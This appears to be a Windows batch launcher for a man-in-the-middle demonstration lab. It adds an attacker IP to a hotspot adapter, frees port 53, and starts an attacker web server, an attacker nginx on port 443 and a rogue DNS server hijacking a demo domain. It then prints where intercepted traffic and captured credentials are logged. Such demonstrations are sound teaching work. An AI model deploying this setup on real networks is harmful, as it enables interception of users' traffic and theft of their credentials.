@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo ============================================
echo   MITM Attack Demo - Start
echo ============================================

REM --- 1. Find hotspot adapter, add virtual IP ---
REM --- 0. Ensure real server is running ---
echo [0/5] Starting real server (if not running)...
tasklist 2>nul | findstr /i "app.py" >nul 2>&1
if errorlevel 1 (
    start "Flask-Real" python app.py
    timeout /t 3 /nobreak >nul
    cd nginx\nginx-1.26.3
    nginx.exe -s quit >nul 2>&1
    timeout /t 1 /nobreak >nul
    start "nginx-REAL" nginx.exe -p . -c conf\nginx.conf
    cd ..\..
    echo   Real server started
) else (
    echo   Real server already running
)

echo [1/5] Adding attacker IP 192.168.137.10...

set IFACE_NAME=
for /L %%i in (1,1,20) do (
    if "!IFACE_NAME!"=="" (
        netsh interface ip show addresses "本地连接* %%i" >nul 2>&1 && (
            netsh interface ip show addresses "本地连接* %%i" 2>&1 | findstr "192.168.137" >nul && set IFACE_NAME=本地连接* %%i
        )
    )
    if "!IFACE_NAME!"=="" (
        netsh interface ip show addresses "Local Area Connection* %%i" >nul 2>&1 && (
            netsh interface ip show addresses "Local Area Connection* %%i" 2>&1 | findstr "192.168.137" >nul && set IFACE_NAME=Local Area Connection* %%i
        )
    )
)

if "!IFACE_NAME!"=="" (
    echo [WARN] Hotspot adapter not found, skipping
) else (
    netsh interface ip add address "!IFACE_NAME!" 192.168.137.10 255.255.255.0 >nul 2>&1
    if errorlevel 1 (echo   IP exists - OK) else (echo   Added 192.168.137.10 to !IFACE_NAME!)
)

REM --- 2. Free port 53 ---
echo [2/5] Freeing port 53...
net stop SharedAccess >nul 2>&1

REM --- 3. Start attacker Flask ---
echo [3/5] Starting attacker Flask (127.0.0.1:5001)...
start "Flask-Attacker" python attacker.py
timeout /t 2 /nobreak >nul

REM --- 4. Start attacker nginx ---
echo [4/5] Starting attacker nginx (192.168.137.10:443)...
cd nginx\nginx-1.26.3
start "nginx-ATTACKER" nginx.exe -p . -c conf\nginx_attacker.conf
cd ..\..

REM --- 5. Start rogue DNS ---
echo [5/5] Starting rogue DNS (port 53, hijack security-demo-lab.xyz)...
start "RogueDNS" python rogue_dns.py
timeout /t 1 /nobreak >nul

REM --- 6. Restore hotspot ---
net start SharedAccess >nul 2>&1

echo.
echo ============================================
echo   Attack environment ready!
echo.
echo   Phone: connect to hotspot
echo          visit https://security-demo-lab.xyz
echo          = TLS cert warning!
echo.
echo   Traffic monitor:
echo     Get-Content attacker_traffic.log -Wait
echo.
echo   Captured credentials:
echo     http://127.0.0.1:5001/attacker-log
echo.
echo   Stop: stop_attack.bat
echo ============================================
pause
